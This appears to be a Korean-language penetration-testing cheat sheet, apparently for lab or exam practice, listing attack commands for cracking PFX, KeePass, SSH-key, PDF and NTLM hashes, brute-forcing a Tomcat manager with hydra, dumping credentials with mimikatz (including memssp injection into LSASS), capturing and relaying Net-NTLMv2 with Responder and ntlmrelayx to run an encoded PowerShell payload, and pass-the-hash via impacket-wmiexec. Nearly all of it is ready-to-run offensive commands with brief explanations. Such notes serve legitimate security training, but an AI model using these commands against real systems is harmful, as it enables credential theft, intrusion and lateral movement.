# base64
- `A-Z`, `a-z`, `0-9`, `+,/,=`만 쓰인다.
- 문자열의 길이가 4의 배수로 끝난다.
```bash
# 줄바꿈 포함하지 않아야 함.
echo -n <base64 encoded> |wc -c
```
---
# pfx
```bash
pfx2john filename > hash
john hash

openssl pkcs12 -in <pfx file> -nocerts -nodes -out private.key
openssl pkcs12 -in <pfx file> -nokeys -clcerts -out public.key

ssh -i <file.pem> host@local

evil-winrm -i <ip> -c <public key> -k <private key> -S 
```
---
# hydra
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html

hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
```
---
# KeePass Password Cracking

``` powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

- C 드라이브 전체에서 `.kdbx` 확장자를 가진 파일을 재귀적으로 검색.
- `-ErrorAction SilentlyContinue` 옵션은 접근 권한 오류 메시지를 숨김.

``` bash
keepass2john Database.kdbx > keepass.hash
```
``` bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
```
login with master password
```
---
# Keepass Dump file Cracking
```bash
python3 poc.py <file.dmp>

# sudo apt install keepassxc
keepassxc <file.kdbx>
```
- https://github.com/matro7sh/keepass-dump-masterkey
---
 
# SSH Private Key Passphrase Cracking

``` bash
ssh2john id_rsa > ssh.hash
```
``` bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
``` bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

---

# Cracking NTLM
``` bash
.\mimikatz.exe
```
``` bash
privilege::debug
```

- `privilege::debug` 명령은 디버그 권한을 활성화합니다.
- 이 권한이 있어야 LSASS 프로세스에 접근하여 자격 증명을 덤프할 수
    있습니다.

``` bash
token::elevate
```

-   토큰을 SYSTEM 권한으로 상승시켜, 보안 제한 없이 시스템 자원에
    접근합니다.


``` bash
lsadump::sam
```

-   SAM(Security Account Manager) 데이터베이스에서 사용자 계정의 해시를
    추출합니다.
-   출력된 해시는 `USERNAME:RID:LM_HASH:NTLM_HASH::: 형식`입니다.


``` bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---
# Cracking Net-NTLMv2
``` bash
sudo responder -I tap0 -v
```
- `-v` : 이전에 캡쳐링 된 해시 다시 캡쳐링 하도록 도와줌.

-   Responder는 NTLM 인증 요청을 가로채서 해시를 수집하는
    도구입니다.
-   `-I tap0` : 사용할 네트워크 인터페이스 지정 (예: `eth0`, `wlan0`,
    `tap0`)
- Responder는 SMB, HTTP, FTP 등 프로토콜을 이용한 인증 요청에
응답해, 클라이언트가 보낸 Net-NTLMv2 해시를 캡처합니다.

``` bash
dir \\192.168.119.2\test
```

-   피해자 시스템에서 네트워크 공유 경로에 접근하게 하여 인증 절차를 유도합니다.
-   이 과정에서 NTLM 인증이 발생하며, Responder가 해시를 가로챕니다.

> 예: 사용자가 `dir \\192.168.119.2\test` 명령을 실행하면, SMB 인증
> 요청이 발생.

``` bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
---
# Relaying Net-NTLMv2
``` bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

-   **impacket-ntlmrelayx**: NTLM 인증을 다른 서비스로 릴레이하여 권한을
    획득하는 도구입니다.
-   `--no-http-server` : HTTP 서버 기능 비활성화 (SMB 릴레이만 사용)
-   `-smb2support` : SMBv2 프로토콜 지원 활성화
-   `-t 192.168.50.212` : 릴레이할 타겟 서버 IP
-   `-c "powershell -enc ..."` : 인증 성공 시 실행할 명령 (여기서는
    Base64 인코딩된 PowerShell 명령)

- 공격자는 Net-NTLMv2 인증 요청을 가로채서, 이를 SMB 서비스가 열려 있는
다른 타겟으로 전달합니다.
타겟이 해당 인증을 신뢰하면, 명령 실행 권한을 얻게 됩니다.

``` bash
dir \\192.168.119.2\test
```

-   피해자 시스템에서 네트워크 공유에 접근하게 하여 SMB 인증을
    유도합니다.
-   인증 요청은 공격자의 시스템을 거쳐 릴레이 타겟(`192.168.50.212`)로
    전달됩니다.
-   인증이 성공하면 지정한 PowerShell 명령이 타겟에서 실행됩니다.

---
# Windows Credential Guard enabled
## 1. 시스템 정보 확인

``` powershell
Get-ComputerInfo
```

-   현재 시스템의 OS 버전, 빌드 번호, 보안 설정 등을 확인합니다.
-   Credential Guard가 활성화되어 있는지 파악하는 데 도움이 됩니다.

## 2. Mimikatz 실행

``` bash
.\mimikatz.exe
```

## 3. 디버그 권한 획득

``` bash
privilege::debug
```

-   SeDebugPrivilege를 활성화하여 LSASS 등의 민감한 프로세스에 접근할 수
    있도록 합니다.
-   관리자 권한 필요.

## 4. 자격 증명 추출 시도

``` bash
sekurlsa::logonpasswords
```

-   현재 로그인된 세션의 사용자 이름, 도메인, 해시, 평문 비밀번호 등을
    덤프합니다.

-   **주의**: Credential Guard 활성화 시 평문 비밀번호 추출이 제한될 수
    있습니다.


## 5. Impacket을 이용한 원격 명령 실행

``` bash
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
```


## 6. MemSSP(메모리 보안 지원 공급자) 주입

``` bash
misc::memssp
```

-   Mimikatz의 `memssp` 모듈은 LSASS에 SSP(Security Support Provider)를
    주입하여 이후 로그인 자격 증명을 `mimilsa.log` 파일에 기록하게
    합니다.
-   새로운 로그인 시도가 발생하면 해당 자격 증명이 평문으로 로깅됩니다.

------------------------------------------------------------------------

## 7. 캡처된 자격 증명 확인

``` bash
type C:\Windows\System32\mimilsa.log
```

-   MemSSP로 캡처된 평문 자격 증명을 확인합니다.
---
# Cracking pdf password
```bash
pdf2john Infrastructure.pdf > pdf.hash

john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 pdf.hash
```
---
# PPK(Putty Private Key File) to PEM
```bash
puttygen <file.ppk> -O private-openssh -o <file.pem>

ssh -i <file.pem> host@local
```
---
# cpassword(groups.xml)
```bash
# pip install gpp-decrypt
gpp-decrypt -f groups.xml
```
